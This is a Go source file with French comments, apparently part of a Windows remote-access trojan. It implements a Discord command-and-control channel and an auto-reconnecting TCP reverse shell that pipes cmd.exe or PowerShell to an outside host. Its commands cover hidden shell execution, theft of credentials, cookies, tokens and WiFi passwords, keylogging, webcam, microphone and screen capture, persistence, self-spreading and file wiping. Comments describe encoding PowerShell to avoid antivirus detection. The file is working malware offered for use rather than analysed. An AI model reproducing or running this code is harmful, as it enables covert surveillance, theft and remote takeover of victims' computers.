// Canal de commande à distance (C2) et reverse shell.
//
// Deux canaux, indépendants l'un de l'autre :
//
//  1. C2 Discord — le bot lit le canal configuré et exécute ce qui y est
//     écrit. Depuis un téléphone, l'application Discord devient le poste de
//     pilotage : !shell, !download, !screenshot, !steal…
//  2. Reverse shell TCP — connexion sortante vers l'hôte et le port choisis,
//     cmd.exe branché sur la socket. Reconnexion automatique.
//
// La sortie de commande est tronquée proprement : Discord refuse au-delà de
// 2000 caractères, et un message de commande ne doit jamais planter le canal.
package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
)

const (
	discordAPI   = "https://discord.com/api/v10"
	discordUA    = "Francais2nd/1.0"
	maxOutputRun = 1800
	cmdTimeout   = 45 * time.Second
)

var c2Seen = map[string]bool{}
var c2FirstPoll = true
var c2Channel string     // salon réellement interrogé (un par machine)
var keylogEnabled = true // flux 5s vers salon keylogs (toggle avec !keylog on/off)

/* ------------------------------------------------------------------ */
/* Appels API Discord                                                 */
/* ------------------------------------------------------------------ */

func discordGet(path string) ([]byte, int, error) {
	req, err := http.NewRequest("GET", discordAPI+path, nil)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
	return b, resp.StatusCode, nil
}

func discordPost(path string, payload any) (int, error) {
	_, code, err := discordPostBody(path, payload)
	return code, err
}

// discordPostBody est la variante qui rend la réponse : indispensable pour
// récupérer l'identifiant d'un salon que l'on vient de créer.
func discordPostBody(path string, payload any) ([]byte, int, error) {
	return discordSendBody("POST", path, payload)
}

// discordPatchBody envoie un correctif JSON (ex. déplacer un salon dans une
// catégorie) : l'API Discord exige PATCH pour ces modifications.
func discordPatchBody(path string, payload any) ([]byte, int, error) {
	return discordSendBody("PATCH", path, payload)
}

func discordSendBody(method, path string, payload any) ([]byte, int, error) {
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, 0, err
	}
	req, err := http.NewRequest(method, discordAPI+path, bytes.NewReader(body))
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", discordUA)
	resp, err := httpc.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4*1024*1024))
	return b, resp.StatusCode, nil
}

// discordRequest fabrique une requête authentifiée sans corps JSON : utilisé
// par les appels de réactions (PUT/DELETE) qui n'envoient rien.
func discordRequest(method, path string, body io.Reader) (*http.Request, error) {
	req, err := http.NewRequest(method, discordAPI+path, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bot "+cfg.BotToken)
	req.Header.Set("User-Agent", discordUA)
	return req, nil
}

// ioCopyDiscard vide et referme un corps de réponse : indispensable pour que
// la connexion HTTP soit réutilisée (sinon fuite de sockets à chaque réaction).
func ioCopyDiscard(resp *http.Response) (int64, error) {
	defer resp.Body.Close()
	return io.Copy(io.Discard, resp.Body)
}

// discordReply envoie un message dans le canal de commande.
func discordReply(text string) {
	text = strings.TrimSpace(text)
	if text == "" {
		text = "OK"
	}
	if len(text) > 1900 {
		text = text[:1900] + "\n… (tronqué)"
	}
	// Le salon change d'une machine à l'autre : on le résout à chaque envoi.
	ch := targetChannel()
	if ch == "" {
		plog("c2 reply: aucun salon cible")
		return
	}
	if _, err := discordPost(fmt.Sprintf("/channels/%s/messages", ch),
		map[string]string{"content": text}); err != nil {
		plog("c2 reply: " + err.Error())
	}
	time.Sleep(700 * time.Millisecond) // limite de débit Discord
}

type discordMessage struct {
	ID      string `json:"id"`
	Content string `json:"content"`
	Author  struct {
		ID string `json:"id"`
	} `json:"author"`
	Mentions []struct {
		ID string `json:"id"`
	} `json:"mentions"`
}

/* ------------------------------------------------------------------ */
/* Boucle de commande                                                  */
/* ------------------------------------------------------------------ */

// discordC2 tourne tant que la configuration contient un jeton et un canal.
func discordC2() {
	for {
		time.Sleep(3 * time.Second)
		if stopped.Load() {
			plog("c2 discord: arrêté par !stop")
			return
		}
		// Le salon dépend de la machine (un salon par poste) : on le suit.
		ch := targetChannel()
		if ch == "" {
			time.Sleep(10 * time.Second)
			continue
		}
		if ch != c2Channel {
			c2Channel = ch
			c2FirstPoll = true // salon neuf : son historique n'est pas une commande
			plog("c2 discord: canal " + ch)
		}
		raw, code, err := discordGet(fmt.Sprintf("/channels/%s/messages?limit=10", ch))
		if err != nil {
			plog("c2 lecture: " + err.Error())
			continue
		}
		if code == 401 || code == 403 {
			plog(fmt.Sprintf("c2: HTTP %d — jeton invalide ou droits insuffisants", code))
			time.Sleep(60 * time.Second)
			continue
		}
		if code != 200 {
			plog(fmt.Sprintf("c2: HTTP %d", code))
			continue
		}
		var msgs []discordMessage
		if json.Unmarshal(raw, &msgs) != nil {
			continue
		}

		// Premier passage : on marque tout l'historique comme lu, sinon les
		// anciens messages seraient rejoués comme des commandes.
		if c2FirstPoll {
			for _, m := range msgs {
				c2Seen[m.ID] = true
			}
			c2FirstPoll = false
			plog("c2: prêt, " + strconv.Itoa(len(msgs)) + " message(s) d'historique ignoré(s)")
			continue
		}

		// msgs est du plus récent au plus ancien : on inverse pour traiter
		// dans l'ordre chronologique.
		for i := len(msgs) - 1; i >= 0; i-- {
			m := msgs[i]
			if c2Seen[m.ID] {
				continue
			}
			c2Seen[m.ID] = true
			if len(c2Seen) > 500 {
				c2Seen = map[string]bool{m.ID: true}
			}
			cmd, ok := c2Parse(m)
			if !ok {
				continue
			}
			plog("c2 commande: " + cmd)
			go c2Execute(cmd)
		}
	}
}

// c2Parse décide si un message est une commande, et laquelle.
func c2Parse(m discordMessage) (string, bool) {
	if m.Content == "" {
		return "", false
	}
	text := strings.TrimSpace(m.Content)

	// On ignore nos propres messages.
	if cfg.BotToken != "" && m.Author.ID == botIDFromToken() {
		return "", false
	}

	mention := "<@" + botIDFromToken() + ">"
	mentionNick := "<@!" + botIDFromToken() + ">"
	if strings.HasPrefix(text, mention) {
		text = strings.TrimSpace(strings.TrimPrefix(text, mention))
	} else if strings.HasPrefix(text, mentionNick) {
		text = strings.TrimSpace(strings.TrimPrefix(text, mentionNick))
	}

	if strings.HasPrefix(text, "!") {
		return strings.TrimSpace(strings.TrimPrefix(text, "!")), true
	}
	// Accepté aussi sans préfixe si le message mentionne explicitement le
	// bot (utile si la lecture du contenu des messages est désactivée).
	for _, mn := range m.Mentions {
		if mn.ID == botIDFromToken() {
			return text, true
		}
	}
	return "", false
}

// botIDFromToken extrait l'identifiant du bot du jeton (base64 : id.token).
func botIDFromToken() string {
	if cfg.ChannelID != "" && len(cfg.BotToken) == 0 {
		return ""
	}
	// Jeton Discord : <base64 id>.<timestamp>.<hmac> — le premier bloc est
	// l'id, en base64 standard sans padding.
	parts := strings.Split(cfg.BotToken, ".")
	if len(parts) == 0 {
		return ""
	}
	b := parts[0]
	for len(b)%4 != 0 {
		b += "="
	}
	raw, err := base64.StdEncoding.DecodeString(b)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(raw))
}

/* ------------------------------------------------------------------ */
/* Exécution des commandes                                             */
/* ------------------------------------------------------------------ */

func c2Execute(command string) {
	defer func() {
		if r := recover(); r != nil {
			discordReply("panique : " + fmt.Sprint(r))
		}
	}()

	fields := strings.Fields(command)
	if len(fields) == 0 {
		return
	}
	name := strings.ToLower(fields[0])
	args := strings.TrimSpace(command[len(fields[0]):])

	switch name {
	case "help", "aide":
		discordReply(c2Help())

	case "shell", "cmd", "c":
		if args == "" {
			discordReply("usage : !shell <commande>")
			return
		}
		out, err := runCmdUTF8(args)
		if err != nil && out == "" {
			discordReply("erreur : " + err.Error())
			return
		}
		deliverOutput("cmd · "+args, out)

	case "shell_ps", "ps", "psh", "powershell":
		if args == "" {
			discordReply("usage : !shell_ps <commande PowerShell>\nex. !shell_ps Get-Process | Select-Object -First 5")
			return
		}
		out, err := runPSUTF8(args)
		if err != nil && out == "" {
			discordReply("erreur : " + err.Error())
			return
		}
		deliverOutput("powershell · "+args, out)

	case "pwd":
		wd, _ := os.Getwd()
		discordReply(wd)

	case "ls", "dir":
		target := args
		if target == "" {
			target, _ = os.Getwd()
		}
		discordReply(listDir(target))

	case "cat", "type":
		discordReply(readTextFile(args))

	case "steal", "exfil":
		stealAll(true)
		discordReply("exfiltration terminée.")

	case "webcam", "cam":
		// Déclenchée par une commande : le résultat revient dans le salon de
		// commande, pas dans le salon webcam (qui reçoit les photos
		// automatiques).
		discordReply("webcam : capture en cours…")
		tmp := workPath("cam-cmd.jpg")
		if err := webcamCaptureTo(tmp); err != nil {
			discordReply("webcam : " + err.Error())
			return
		}
		data, rerr := os.ReadFile(tmp)
		_ = os.Remove(tmp)
		if rerr != nil || len(data) < 1024 {
			discordReply("webcam : image invalide.")
			return
		}
		name := "cam-" + time.Now().Format("060102-150405") + ".jpg"
		discordUploadToChannel(fileOut{Name: name, Data: data})
		discordReply("photo webcam — " + strconv.Itoa(len(data)/1024) + " Ko.")

	case "mic", "micro", "audio":
		sec := 10
		if v, err := atoi(args); err == nil && v > 0 {
			sec = v
		}
		discordReply("microphone : enregistrement " + strconv.Itoa(sec) + " s…")
		discordReply(micRecord(sec))

	case "images", "photos":
		discordReply(bulkImages())

	case "webcamrec", "camrec":
		if args == "" {
			discordReply("usage : !webcamrec <secondes 1-300>")
			return
		}
		sec, _ := strconv.Atoi(strings.TrimSpace(args))
		discordReply(webcamRecord(sec))

	case "screenshot", "shot", "cap":
		parts := strings.Fields(args)
		if len(parts) > 0 {
			switch strings.ToLower(parts[0]) {
			case "hd", "max":
				setShotScale(3)
				discordReply("captures en haute définition (x3). `!screenshot scale 1` pour revenir au natif.")
				return
			case "scale":
				if len(parts) > 1 {
					if n, err := atoi(parts[1]); err == nil {
						setShotScale(n)
						discordReply(fmt.Sprintf("échelle des captures : x%d.", shotScaleValue()))
					}
				}
				return
			}
			if n, err := atoi(parts[0]); err == nil && n > 0 {
				monitor := 0
				count := 10
				if len(parts) > 1 {
					monitor, _ = atoi(parts[1])
				}
				if len(parts) > 2 {
					count, _ = atoi(parts[2])
				}
				discordReply(scheduledScreenshots(n, monitor, count))
				return
			}
		}
		// Capture demandée : elle revient dans le salon de commande, avec les
		// deux écrans s'il y en a deux. Les captures automatiques continuent
		// d'aller dans le salon screenshots.
		shots := shotsNow()
		if len(shots) == 0 {
			discordReply("capture impossible.")
			return
		}
		ch := targetChannel()
		if ch == "" {
			ch = screenshotsChannel()
		}
		names := shotFilenames(len(shots))
		var files []fileOut
		for i, b := range shots {
			files = append(files, fileOut{Name: names[i], Data: b})
		}
		sendFilesTo(ch, files...)
		discordReply(fmt.Sprintf("%d capture(s) envoyée(s) ici (x%d).", len(files), shotScaleValue()))

	case "search", "find":
		parts := strings.Fields(args)
		pattern := ""
		maxRes := 50
		if len(parts) > 0 {
			pattern = parts[0]
		}
		if len(parts) > 1 {
			maxRes, _ = strconv.Atoi(parts[1])
		}
		discordReply(searchFiles(pattern, maxRes))

	case "download", "get":
		if args == "" {
			discordReply("usage : !download <fichier|dossier>")
			return
		}
		discordReply(zipAndUpload(args))

	case "upload":
		parts := strings.Fields(args)
		if len(parts) < 2 {
			discordReply("usage : !upload <url> <destination>")
			return
		}
		discordReply(uploadFromURL(parts[0], parts[1]))

	case "exec", "run":
		parts := strings.Fields(args)
		if len(parts) == 0 {
			discordReply("usage : !exec <fichier> [args]")
			return
		}
		path := parts[0]
		argsRest := ""
		if len(parts) > 1 {
			argsRest = strings.Join(parts[1:], " ")
		}
		discordReply(execFile(path, argsRest))

	case "rm", "suppr":
		discordReply(deletePath(args))

	case "salons", "channels", "salon":
		discordReply(channelsReport())

	case "spread", "copie", "duplique":
		discordReply(spreadCopies(true))

	case "files", "tout", "bulk":
		discordReply("extraction massive lancée dans les salons fichiers…")
		go func() {
			if msg := bulkUploadAll(true); msg != "" {
				discordReply(msg)
			}
		}()

	case "delete", "wipe":
		discordReply(wipeAll(args))

	case "apps", "ps-list", "processus", "opened", "applis":
		discordReply(listApps(args))

	case "open":
		discordReply(openTarget(args))

	case "close":
		discordReply(closeWindow(args))

	case "kill", "taskkill":
		discordReply(killTarget(args))

	case "prank", "blague":
		parts := strings.SplitN(args, " ", 2)
		kind := ""
		rest := ""
		if len(parts) > 0 {
			kind = parts[0]
		}
		if len(parts) > 1 {
			rest = parts[1]
		}
		discordReply(prankRun(kind, rest))

	case "menu", "boutons":
		id := postStatus(true)
		if id == "" {
			discordReply("menu indisponible (jeton bot ou salon manquant).")
			return
		}
		discordReply("bandeau d'état republié : réagis avec 🖥️ 📷 🔑 ℹ️ 📁 ⛔.")

	case "shutdown", "off":
		restart := strings.Contains(strings.ToLower(args), "r") || strings.Contains(strings.ToLower(args), "restart")
		timeout := 30
		for _, f := range strings.Fields(args) {
			if n, err := strconv.Atoi(f); err == nil {
				timeout = n
				break
			}
		}
		// Le poste va s éteindre : on le signale dans infos avant de couper.
		botSendText(infosChannel(), fmt.Sprintf("PC éteint à %s (%s dans %d s).", time.Now().Format("02/01 15:04"), map[bool]string{true: "redémarrage", false: "arrêt"}[restart], timeout))
		discordReply(shutdownPC(restart, timeout))

	case "wifi":
		discordReply(wifiReport())

	case "location", "loc", "geo", "localisation", "position":
		discordReply(locationReport())

	case "keylog", "kl":
		fields2 := strings.Fields(args)
		if len(fields2) >= 1 && strings.ToLower(fields2[0]) == "off" {
			keylogEnabled = false
			discordReply("keylog flux désactivé.")
			return
		}
		if len(fields2) >= 1 && strings.ToLower(fields2[0]) == "on" {
			keylogEnabled = true
			discordReply("keylog flux activé.")
			return
		}
		keylogFlush()
		data := readFileOr(workPath("kl.log"), nil)
		if len(data) == 0 {
			discordReply("kl.log vide.")
			return
		}
		ch := keylogChannel()
		if ch != "" && ch != targetChannel() {
			sendFilesTo(ch, fileOut{Name: "kl.log", Data: data})
			discordReply("journal complet déposé dans <#" + ch + "> (" +
				strconv.Itoa(len(data)) + " octets).")
			return
		}
		discordUploadToChannel(fileOut{Name: "kl.log", Data: data})

	case "deleteall", "efface":
		discordReply(wipeAll(args))

	case "status":
		priv := "standard"
		if isElevated() {
			priv = "admin"
		}
		ws := "actif"
		if stopped.Load() {
			ws = "arrêté"
		}
		discordReply(fmt.Sprintf("**Status**\nPayload : %s\nPrivilèges : %s\nPersistance : %s\nKeylog : %v\nCaptures : x%d\nDernier salon : <#%s>\nBot : %s",
			ws, priv, persistStatus(), keylogEnabled, shotScaleValue(), targetChannel(), botIDFromToken()))

	case "licence", "license", "cle":
		lic := strings.TrimSpace(licenceReport())
		if lic == "" {
			discordReply("aucune clé d'activation trouvée dans le Registre.")
			return
		}
		priv := "utilisateur standard"
		if isElevated() {
			priv = "administrateur"
		}
		discordReply("```\n" + lic + "\nélévation : " + priv + "\n```")

	case "elevate", "admin":
		if args == "" {
			discordReply("usage : !elevate <commande PowerShell>\n" +
				"La commande tourne en administrateur : accepte l'invite UAC **sur la machine** " +
				"(aucune élévation silencieuse n'est possible depuis un processus utilisateur).")
			return
		}
		if isElevated() {
			out, err := runCmdLinePS(args)
			if err != nil && out == "" {
				discordReply("erreur : " + err.Error())
				return
			}
			discordReply("[admin]\n```\n" + out + "\n```")
			return
		}
		out, err := runElevatedCommand(args)
		if err != nil {
			discordReply("élévation : " + err.Error())
			return
		}
		discordReply("[admin]\n```\n" + out + "\n```")

	case "clip":
		discordReply("```\n" + clipboardText() + "\n```")

	case "sysinfo":
		s, err := systemReport()
		if err != nil {
			discordReply("erreur : " + err.Error())
			return
		}
		discordReply(s)

	case "persist":
		discordReply(persistSet(strings.ToLower(strings.TrimSpace(args))))

	case "defender", "av", "wd":
		discordReply(defenderReport(args))

	case "shell_tcp", "connect":
		fields2 := strings.Fields(args)
		if len(fields2) < 2 {
			discordReply("usage : !shell_tcp <hote> <port> [cmd|ps]")
			return
		}
		kind := "cmd"
		if len(fields2) >= 3 {
			kind = fields2[2]
		}
		discordReply("reverse shell " + shellKind(kind) + " vers " + fields2[0] + ":" + fields2[1] +
			" — connecte-toi, la sortie sera sous peu disponible.")
		go func() { _ = shellOnce(fields2[0], fields2[1], kind) }()

	case "stop", "exit":
		cfg.Enabled = false
		stopped.Store(true)
		postStatus(false)
		discordReply("payload arrêté : extraction, journal, captures et envois " +
			"s'arrêtent. La persistance reste en place — tape `!persist off` " +
			"ou `!delete confirm` pour tout retirer. Relance l'application pour redémarrer.")

	default:
		// Tout le reste est traité comme une commande shell.
		out, err := runCmdLine(command)
		if err != nil && out == "" {
			discordReply("commande inconnue : " + name + " — tape !help")
			return
		}
		discordReply("```\n" + out + "\n```")
	}
}

func c2Help() string {
	return "```\n" +
		"!shell <cmd>         cmd.exe, sortie complète (.txt si longue)\n" +
		"!ps <cmd>            PowerShell, sortie complète\n" +
		"!ls [chemin]         liste un dossier\n" +
		"!cat <fichier>       affiche un texte\n" +
		"!download <cible>    envoie fichier/dossier (zip auto)\n" +
		"!upload <url> <dest> télécharge depuis une URL\n" +
		"!exec <fichier> [a]  exécute un fichier local\n" +
		"!open <cible>        ouvre fichier/dossier/url\n" +
		"!close <pid|nom>     ferme la fenêtre\n" +
		"!kill <pid|nom>      tue le processus\n" +
		"!apps [filtre]       applications ouvertes + chemins\n" +
		"!files               extraction massive (eval + PDF d'abord)\n" +
		"!salons              crée/vérifie les 9 salons\n" +
		"!spread              duplique l'exe sur le poste\n" +
		"!rm <chemin>         supprime fichier/dossier\n" +
		"!screenshot          captures (salon -screenshots)\n" +
		"!screenshot hd       agrandit x3 (scale 1|2|3)\n" +
		"!screenshot <s> [m] [n]  captures programmées\n" +
		"!webcam              photo webcam\n" +
		"!webcamrec <s>       vidéo webcam AVI (1-300 s)\n" +
		"!mic [s]             audio du microphone (WAV)\n" +
		"!images              toutes les images du poste\n" +
		"!steal               identifiants, cookies, jetons\n" +
		"!keylog              journal complet\n" +
		"!keylog on|off       flux 5 s dans le salon keylogs\n" +
		"!clip                presse-papiers\n" +
		"!sysinfo             état de la machine\n" +
		"!wifi                mots de passe WiFi\n" +
		"!localisation        position + adresse précise\n" +
		"!search <motif> [n]  recherche fichiers\n" +
		"!licence             clés d'activation Windows\n" +
		"!elevate <cmd>       PowerShell en admin (UAC)\n" +
		"!persist on|off      démarrage avec Windows\n" +
		"!defender            état Defender (exclude = exclusions)\n" +
		"!prank <effet> [a]   msg, wall, url, speak, beep, cd,\n" +
		"                     rotate, taskbar, volume, lock, swapmouse\n" +
		"!shell_tcp <h> <p>   reverse shell TCP\n" +
		"!shutdown [r] [ts]   éteint (r=redémarre)\n" +
		"!status              état payload, privilèges, persistance\n" +
		"!menu                republie le bandeau à réactions\n" +
		"!stop                arrête le payload (persistance intacte)\n" +
		"!delete confirm      SUPPRESSION TOTALE (tout retirer)\n" +
		"```"
}

/* ------------------------------------------------------------------ */
/* Commandes shell                                                     */
/* ------------------------------------------------------------------ */

// runCmdLine exécute via cmd.exe sans jamais ouvrir de console visible.
func runCmdLine(command string) (string, error) {
	return runHidden("cmd.exe", "/c", command)
}

// runCmdLinePS exécute via powershell.exe : -NoProfile évite la latence du
// profil, -NonInteractive empêche toute invite, -NoLogo supprime le bandeau.
func runCmdLinePS(command string) (string, error) {
	return runHidden("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive",
		"-ExecutionPolicy", "Bypass", "-Command", command)
}

// qPS enchâsse un chemin pour un script PowerShell (guillemets simples).
func qPS(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }

// psEncoded encode un script PowerShell en base64 de UTF-16LE : la forme
// attendue par -EncodedCommand. Le script ne transite jamais par un fichier
// .ps1 sur disque — un fichier script était scanné statiquement et finissait
// en détection (c'est ce qui a fait tomber sysupdate.vbs).
func psEncoded(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, 0, len(u)*2)
	for _, r := range u {
		b = append(b, byte(r), byte(r>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}

// runElevatedCommand exécute une commande PowerShell en administrateur :
// corps encodé en ligne de commande (aucun script sur disque), lancement
// ShellExecute « runas » (invite UAC affichée sur la machine — aucune
// élévation silencieuse possible), puis lecture du fichier de sortie.
func runElevatedCommand(psCommand string) (string, error) {
	out := workPath(fmt.Sprintf("u%d.out", time.Now().UnixNano()))
	body := "$ErrorActionPreference='Continue'\r\n& {\r\n" + psCommand + "\r\n} *> " + qPS(out) + "\r\n"
	args := "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + psEncoded(body)
	if err := runElevated("powershell.exe", args); err != nil {
		return "", err
	}
	plog("elevate: invite UAC envoyée")
	// 30 s de patience : l'invite peut rester affichée sur la machine.
	var data []byte
	for i := 0; i < 60; i++ {
		time.Sleep(500 * time.Millisecond)
		if b, err := os.ReadFile(out); err == nil {
			data = b
			break
		}
	}
	_ = os.Remove(out)
	if len(data) == 0 {
		plog("elevate: aucune sortie apres 30 s")
		return "", fmt.Errorf("aucune sortie après 30 s (invite refusée, commande sans sortie ou erreur de syntaxe)")
	}
	plog(fmt.Sprintf("elevate: sortie recue (%d octets)", len(data)))
	return truncate(string(data), maxOutputRun), nil
}

func runHidden(name string, args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	c := exec.CommandContext(ctx, name, args...)
	// CREATE_NO_WINDOW (0x08000000) + fenêtre masquée : aucun flash, aucun
	// processus console dans la barre des tâches.
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf
	err := c.Run()

	out := buf.String()
	if ctx.Err() == context.DeadlineExceeded {
		out += "\n[timeout après " + cmdTimeout.String() + "]"
	}
	if len(out) > maxOutputRun {
		out = out[:maxOutputRun] + "\n… (tronqué)"
	}
	return out, err
}

func listDir(target string) string {
	entries, err := os.ReadDir(target)
	if err != nil {
		return "erreur : " + err.Error()
	}
	var b strings.Builder
	b.WriteString(target + "\n")
	for _, e := range entries {
		if b.Len() > 1700 {
			b.WriteString("… (tronqué)\n")
			break
		}
		info, err := e.Info()
		size := int64(0)
		if err == nil {
			size = info.Size()
		}
		mark := "   "
		if e.IsDir() {
			mark = "[d]"
		}
		fmt.Fprintf(&b, "%s %-60s %10d\n", mark, e.Name(), size)
	}
	return b.String()
}

func readTextFile(path string) string {
	if path == "" {
		return "usage : !cat <fichier>"
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return "erreur : " + err.Error()
	}
	if len(b) > 7*1024*1024 {
		b = b[:7*1024*1024]
	}
	if len(b) > 1700 {
		return "```\n" + string(b[:1700]) + "\n… (tronqué, utilise !download)\n```"
	}
	return "```\n" + string(b) + "\n```"
}

func downloadFile(path string) string {
	if path == "" {
		return "usage : !download <fichier>"
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return "erreur : " + err.Error()
	}
	if len(b) > 7*1024*1024 {
		return "fichier trop volumineux (" + strconv.Itoa(len(b)/1024/1024) + " Mo) : limite 7 Mo"
	}
	discordUploadToChannel(fileOut{Name: filepath.Base(path), Data: b})
	return "fichier envoyé : " + filepath.Base(path) + " (" + strconv.Itoa(len(b)) + " octets)"
}

func readFileOr(path string, fallback []byte) []byte {
	b, err := os.ReadFile(path)
	if err != nil {
		return fallback
	}
	return b
}

// discordUploadToChannel envoie des pièces jointes dans le salon de la
// machine : même chemin que l'extraction automatique (payload.go).
func discordUploadToChannel(files ...fileOut) {
	sendFiles(files...)
	time.Sleep(700 * time.Millisecond) // limite de débit Discord
}

/* ------------------------------------------------------------------ */
/* Reverse shell TCP                                                   */
/* ------------------------------------------------------------------ */

// reverseShellLoop maintient la connexion ouverte en permanence.
func reverseShellLoop() {
	for {
		if stopped.Load() {
			return
		}
		if !cfg.ShellEnable || cfg.ShellHost == "" || cfg.ShellPort <= 0 {
			return
		}
		addr := net.JoinHostPort(cfg.ShellHost, strconv.Itoa(cfg.ShellPort))
		conn, err := net.DialTimeout("tcp", addr, 20*time.Second)
		if err != nil {
			plog("shell: connexion impossible vers " + addr + " : " + err.Error())
			time.Sleep(30 * time.Second)
			continue
		}
		plog("shell: connecté à " + addr)
		shellOnceConn(conn, "cmd")
		conn.Close()
		time.Sleep(20 * time.Second)
	}
}

// shellOnce ouvre une connexion pour une commande ponctuelle. kind = "cmd"
// ou "ps" (PowerShell), exigé par !shell_tcp.
func shellOnce(host, port, kind string) error {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 20*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()
	return shellOnceConn(conn, kind)
}

// shellKind normalise l'interpréteur demandé : "cmd" par défaut, sinon
// PowerShell (« ps », « powershell », « pwsh »).
func shellKind(kind string) string {
	k := strings.ToLower(strings.TrimSpace(kind))
	if k == "ps" || k == "powershell" || k == "pwsh" {
		return "PowerShell"
	}
	return "cmd"
}

// shellOnceConn branche cmd.exe (ou powershell.exe) sur la socket : entrées
// et sorties vont directement sur le canal, sans tampon intermédiaire.
func shellOnceConn(conn net.Conn, kind string) error {
	kind = shellKind(kind)
	_, _ = conn.Write([]byte("=== " + hostname() + " / " + os.Getenv("USERNAME") +
		" [" + kind + "] ===\n"))

	// PowerShell alimenté par une pipette (stdin non console) n'exécute les
	// commandes qu'à la fermeture complète de l'entrée : on lit donc la
	// socket ligne à ligne et on exécute chaque ligne séparément. L'état
	// d'une ligne à l'autre n'est pas conservé ; la sortie revient au fil de
	// l'eau.
	if kind == "PowerShell" {
		return psShellLoop(conn)
	}

	var cmd *exec.Cmd
	cmd = exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	// Enveloppé : si le processus enfant reste bloqué sur une sortie, le
	// timeout le tue et la boucle de reconnexion reprend la main.
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return err
	}
	go func() { done <- cmd.Wait() }()

	select {
	case <-done:
		return nil
	case <-time.After(30 * time.Minute):
		_ = cmd.Process.Kill()
		return nil
	}
}

// psShellLoop joue une session PowerShell sur la socket : chaque ligne reçue
// devient une commande -Command, la sortie (stdout + stderr) revient au fil
// de l'eau. L'état n'est pas conservé d'une ligne à l'autre - c'est le prix
// d'une exécution fiable quand stdin n'est pas une console.
func psShellLoop(conn net.Conn) error {
	sc := bufio.NewScanner(conn)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		if strings.EqualFold(line, "exit") || strings.EqualFold(line, "quit") {
			return nil
		}
		out, err := runCmdLinePS(line)
		if out == "" && err != nil {
			out = "erreur : " + err.Error() + "\n"
		}
		if out != "" && !strings.HasSuffix(out, "\n") {
			out += "\n"
		}
		if _, werr := conn.Write([]byte(out)); werr != nil {
			return werr
		}
	}
	return sc.Err()
}
